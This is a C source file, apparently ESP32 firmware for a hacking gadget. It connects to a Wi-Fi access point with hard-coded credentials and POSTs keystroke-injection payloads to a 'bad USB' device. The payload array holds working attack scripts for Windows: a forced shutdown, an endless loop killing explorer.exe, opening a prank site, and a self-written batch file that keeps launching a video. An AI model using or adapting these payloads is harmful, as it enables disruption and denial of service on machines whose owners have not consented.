#include "wifi_bad_usb.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "esp_http_client.h"
#include "globals.h"
#include "botones.h"
#include "u8g2_esp32_hal.h"
#include "esp_log.h"
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include "nvs_flash.h"
#include "esp_netif.h"

// Configuracion de Wi-Fi
const char *payloads[4] = {
  "{\"content\":\"DELAY 1000 \\nGUI R \\nDELAY 500 \\nSTRING powershell -Command \\\"Stop-Computer -Force\\\" \\nDELAY 500 \\nENTER\"}",
  
  "{\"content\":\"DELAY 1000 \\nGUI R \\nDELAY 500 \\nSTRING powershell /w 1; For(;;){Stop-Process -name explorer} \\nDELAY 500 \\nENTER\"}",
  
  "{\"content\":\"DELAY 1000 \\nGUI R \\nDELAY 300 \\nSTRING powershell -Command \\\"Start-Process https://jonnybanana.github.io/safari-ie-reaper.github.io\\\" \\nDELAY 200 \\nENTER\"}",
  
  "{\"content\":\"GUI r \\nDELAY 500 \\nSTRING cmd \\nENTER \\nDELAY 300 \\nSTRING if exist rr.bat del /f /q rr.bat \\nENTER \\nDELAY 300 \\nSTRING copy con rr.bat \\nENTER \\nSTRING @ECHO OFF \\nSTRING PING 127.0.0.1 -n 5 > NUL \\nENTER \\nSTRING :LOOP \\nENTER \\nSTRING start https://www.youtube.com/watch?v=uHgt8giw1LY&ab_channel=Licale \\nENTER \\nSTRING PING 127.0.0.1 -n 300 > NUL \\nENTER \\nSTRING GOTO LOOP \\nENTER \\nCTRL C \\nDELAY 300 \\nSTRING cls && rr.bat \\nENTER \\nGUI DOWNARROW\"}"
};


// Definir el log tag para la depuracion
static const char *TAG = "BAD_USB";

// Funcion para conectar a Wi-Fi y enviar la solicitud HTTP

void conectar_bad_usb(int item_sel_idx) {
    esp_err_t ret;

    // Inicializar NVS
    ESP_LOGI(TAG, "Inicializando NVS...");
    ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error inicializando NVS: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Init NVS!", true);
        return;
    }

    // Inicializar la pila de red y el loop de eventos
    ESP_LOGI(TAG, "Inicializando pila de red y eventos...");
    ESP_ERROR_CHECK(esp_netif_init());                      // Inicializacion de la pila de red
    ESP_ERROR_CHECK(esp_event_loop_create_default());       // Creacion del loop de eventos por defecto
    esp_netif_t *wifi_sta = esp_netif_create_default_wifi_sta(); // Crear interfaz de Wi-Fi

    // Inicializacion de la pila de Wi-Fi
    ESP_LOGI(TAG, "Inicializando la pila de Wi-Fi...");
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ret = esp_wifi_init(&cfg);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error inicializando Wi-Fi: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Init Wi-Fi!", true);
        return;
    }

    // Configurar Wi-Fi en modo estacion
    ESP_LOGI(TAG, "Configurando Wi-Fi en modo estacion...");
    ret = esp_wifi_set_mode(WIFI_MODE_STA);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error configurando modo Wi-Fi: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Configuracion Wi-Fi!", true);
        return;
    }

    // Configuracion de las credenciales de Wi-Fi
    wifi_config_t wifi_config = {
        .sta = {
            .ssid = "Pico WIFI DUCK",
            .password = "pico123456",
        },
    };
    ESP_LOGI(TAG, "Configurando credenciales de Wi-Fi...");
    ret = esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error configurando credenciales Wi-Fi: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Configuracion!", true);
        return;
    }

    // Iniciar Wi-Fi
    ESP_LOGI(TAG, "Iniciando Wi-Fi...");
    mostrar_mensaje("Conectando...", false);
    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error iniciando Wi-Fi: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Iniciando Wi-Fi!", true);
        return;
    }

    // Intentar conectarse al AP
    ESP_LOGI(TAG, "Intentando conectar a Wi-Fi...");
    ret = esp_wifi_connect();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Error conectando a Wi-Fi: %s", esp_err_to_name(ret));
        mostrar_mensaje("Error Conexion!", true);
        goto wifi_close;
    }


    // Verificacion de conexion al AP
    wifi_ap_record_t ap_info;
    unsigned long startAttemptTime = esp_timer_get_time();
    bool connected = false;

    while ((esp_timer_get_time() - startAttemptTime) < 10000000) {  // 10 segundos
        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
            connected = true;
            break;
        }
        vTaskDelay(500 / portTICK_PERIOD_MS);
    }

    if (!connected) {
        ESP_LOGE(TAG, "Conexion Wi-Fi fallida después de 10 segundos.");
        mostrar_mensaje("Conexion fallida", true);
        goto wifi_close;
    }
	mostrar_mensaje("Enviando...", false);
    ESP_LOGI(TAG, "Conexion Wi-Fi exitosa");
	vTaskDelay(3000 / portTICK_PERIOD_MS);
    // Enviar la solicitud HTTP
    ESP_LOGI(TAG, "Enviando datos Bad USB...");
    esp_http_client_config_t config = {
        .url = "http://192.168.4.1/api",  // Asegúrate de que la IP sea correcta
        .method = HTTP_METHOD_POST,
        .timeout_ms = 5000,
    };

    esp_http_client_handle_t client = esp_http_client_init(&config);
    if (client == NULL) {
        ESP_LOGE(TAG, "No se pudo inicializar el cliente HTTP");
        mostrar_mensaje("Error Cliente HTTP", true);
        goto wifi_disconnect;
    }

       // Establece el payload y su longitud exacta
    const char *payload = payloads[item_sel_idx];
    esp_http_client_set_header(client, "Content-Type", "application/json");
    esp_http_client_set_post_field(client, payload, strlen(payload));

    ret = esp_http_client_perform(client);
    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "Solicitud HTTP enviada correctamente. Codigo de respuesta: %d", esp_http_client_get_status_code(client));
    } else {
        ESP_LOGE(TAG, "Error en la solicitud HTTP: %s", esp_err_to_name(ret));
        mostrar_mensaje("Se ha enviado!", true);
    }

    esp_http_client_cleanup(client);
wifi_disconnect:
	esp_wifi_disconnect();
wifi_close:
    esp_wifi_stop();
    esp_wifi_deinit();
    esp_netif_destroy_default_wifi(wifi_sta);
    esp_netif_deinit();
    esp_event_loop_delete_default();
}
